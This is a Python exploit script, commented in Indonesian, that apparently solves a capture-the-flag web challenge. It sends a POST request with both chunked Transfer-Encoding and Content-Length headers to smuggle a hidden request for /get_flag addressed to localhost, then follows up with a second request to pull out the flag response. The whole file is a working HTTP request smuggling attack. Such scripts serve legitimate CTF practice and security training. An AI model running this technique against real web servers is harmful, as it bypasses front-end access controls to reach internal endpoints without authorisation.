import socket
import time

TARGET_HOST = "chall1.lagncra.sh"
TARGET_PORT = 14391

def solve():
    # 1. Payload penyelundupan
    # Pastikan ada double \r\n di akhir smuggled request
    smuggled_request = (
        "GET /get_flag HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
    )

    body = "0\r\n\r\n" + smuggled_request
    
    # Request POST Utama
    request1 = (
        "POST / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{body}"
    )

    # 2. Request Dummy untuk memancing respon flag
    request2 = (
        "GET / HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_HOST, TARGET_PORT))
        
        print("[*] Mengirim payload penyelundupan...")
        s.sendall(request1.encode())
        
        # Berikan jeda sangat singkat agar server memproses
        time.sleep(0.5)
        
        print("[*] Mengirim request pancingan...")
        s.sendall(request2.encode())

        # Membaca semua data yang datang
        full_response = b""
        while True:
            try:
                data = s.recv(4096)
                if not data:
                    break
                full_response += data
            except socket.timeout:
                break

        responses = full_response.decode(errors='ignore').split("HTTP/1.1")
        
        for i, res in enumerate(responses):
            if res.strip():
                print(f"\n[+] Respon {i}:")
                print("-" * 30)
                print(f"HTTP/1.1{res}")

        s.close()
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    solve()
